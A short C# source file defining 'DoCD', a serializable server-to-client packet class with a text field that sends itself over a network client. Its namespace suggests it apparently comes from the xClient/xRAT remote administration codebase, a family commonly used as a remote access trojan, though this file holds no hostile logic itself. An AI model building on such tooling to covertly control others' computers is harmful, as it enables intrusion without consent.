using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoCD : IPacket
{
	public string Text { get; set; }

	public DoCD()
	{
	}

	public DoCD(string text)
	{
		Text = text;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
